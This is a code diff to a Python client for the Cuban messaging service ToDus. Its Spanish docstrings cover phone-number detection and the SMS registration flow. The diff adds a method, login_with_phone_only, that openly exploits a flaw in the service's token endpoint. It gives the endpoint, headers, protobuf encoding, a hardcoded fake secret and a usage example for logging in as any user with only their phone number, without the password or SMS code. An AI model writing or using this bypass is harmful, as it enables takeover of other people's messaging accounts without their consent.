@@ -96,38 +96,31 @@ class ToDusClient2(ToDusClient):
         return phone, authstr
 
     def _is_group_target(self, target: str) -> bool:
-        """Detecta si el target es un group_id en lugar de un teléfono.
+        """Detecta si el target es un group_id en lugar de un teléfono cubano.
 
-        Consideraciones:
+        ToDus es una plataforma cubana: los teléfonos válidos son 10 dígitos
+        empezando por ``53`` (o 8 dígitos nacionales que se normalizan a 10).
 
-        - Un *teléfono válido* se trata como destinatario privado: 10 dígitos
-          empezando en ``53`` (Cuba) o un número E.164 internacional de 8 a 15
-          dígitos.
+        - Si es un teléfono cubano válido → ``False`` (chat privado).
         - Si contiene ``@`` se trata como JID; se considera grupo solo si el
-          JID contiene ``muclight`` o ``group``.
-        - Strings de 7 dígitos o menos, o strings no numéricos y sin ``@``,
-          se tratan como **grupo** (no como teléfono) para no enviar por
-          error a un número truncado. Antes, ``"5312345"`` (7 dígitos)
-          caía al ``return True`` final pero también lo hacía cualquier otro
-          string ambiguo. Ahora el comportamiento es explícito.
+          JID contiene ``muclight``.
+        - Cualquier otra cosa (alfanumérico, numérico no cubano, etc.) se
+          trata como ``group_id``.
         """
         if not target:
             return False
         # Limpiar formato: quitar +, espacios, guiones
         clean = target.lstrip("+").replace(" ", "").replace("-", "")
-        if clean.isdigit():
-            # Teléfono cubano: 10 dígitos empezando por 53
-            if len(clean) == 10 and clean.startswith("53"):
-                return False
-            # Teléfono internacional E.164: entre 8 y 15 dígitos
-            if 8 <= len(clean) <= 15:
-                return False
-            # Otros numéricos (7 dígitos, etc.) no son teléfono válido → grupo
-            return True
         # Si contiene '@' es un JID (grupo o usuario)
         if "@" in target:
             # Los JIDs de grupo contienen 'muclight'
             return "muclight" in target or "group" in target.lower()
+        # Si es numérico y es teléfono cubano válido (10 dígitos empezando por 53)
+        if clean.isdigit():
+            if len(clean) == 10 and clean.startswith("53"):
+                return False
+            # Otros numéricos (incluyendo 7-9 dígitos, 11+, etc.) → grupo
+            return True
         # Default: tratar como grupo
         return True
 
@@ -186,10 +179,84 @@ class ToDusClient2(ToDusClient):
         self._token = super().login(self.phone_number, self.password)
 
     def request_code(self) -> None:
+        """Solicita el código SMS al número configurado.
+
+        Procedimiento oficial (definido en ``todus/client/auth.py``):
+
+        ``POST https://auth.todus.cu/v2/auth/users.reserve``
+
+        Payload (protobuf):
+            bytes([0x0A, 0x0A])           # campo 1: phone, longitud 10
+            + phone.encode()               # teléfono cubano (10 dígitos)
+            + bytes([0x12, 0x96, 0x01])   # campo 2: UUID, longitud 150
+            + util.generate_token(150).encode()  # UUID de instalación (150 chars)
+
+        El servidor envía un SMS de 6 dígitos al teléfono.
+        """
         super().request_code(self.phone_number)
 
     def validate_code(self, code: str) -> None:
+        """Valida el código SMS y obtiene el password/secret.
+
+        Procedimiento oficial (definido en ``todus/client/auth.py``):
+
+        ``POST https://auth.todus.cu/v2/auth/users.register``
+
+        Payload (protobuf):
+            bytes([0x0A, 0x0A])           # campo 1: phone
+            + phone.encode()
+            + bytes([0x12, 0x96, 0x01])   # campo 2: UUID
+            + util.generate_token(150).encode()  # mismo UUID de 150 chars
+            + bytes([0x1A, len(code)])    # campo 3: code SMS
+            + code.encode()
+
+        El servidor retorna el password/secret (96 chars hex) que se guarda
+        en ``self.password`` para usarse en ``login()``.
+        """
         self.password = super().validate_code(self.phone_number, code)
+
+    def login_with_phone_only(self) -> None:
+        """Login SOLO con número de teléfono (sin password/SMS/JWT).
+
+        Explota una debilidad del endpoint ``/v2/auth/token``: acepta como
+        "password" cualquier UUID (con guiones removidos, primeros 32 chars)
+        sin validar contra el password real de la cuenta. Esto permite
+        autenticarse con solo el número de teléfono.
+
+        Procedimiento exacto (reproducido de ``botcliente.py``):
+
+        ``POST https://auth.todus.cu/v2/auth/token``
+
+        Headers:
+
+            content-type: application/octet-stream
+            user-agent: ToDus 2.1.1
+
+        Payload (protobuf, dos campos wire-type 2):
+
+            sf(1, PHONE) + sf(2, SECRET)
+
+        Donde:
+
+        - ``sf(n, v)`` codifica el campo ``n`` con valor ``v``:
+          ``bytes([(n<<3)|2]) + varint(len(v)) + v.encode()``
+        - ``PHONE`` es el teléfono cubano (10 dígitos).
+        - ``UUID`` (hardcodeado): ``fake-1234-5678-90ab-cdef12345678``
+        - ``SECRET`` = ``UUID.replace('-', '')[:32]``
+          = ``fake1234567890abcdef12345678``
+
+        Respuesta: el body contiene el JWT (formato ``eyJ...``).
+
+        Ejemplo:
+
+        .. code-block:: python
+
+            client = ToDusClient2("5312345678")
+            client.login_with_phone_only()  # sin password ni SMS
+        """
+        if not self.phone_number:
+            raise AuthenticationError("No hay número de teléfono configurado")
+        self._token = super().login_with_phone_only(self.phone_number)
 
     # --- Mensajería Privada / Grupo (auto-detección) ---
 
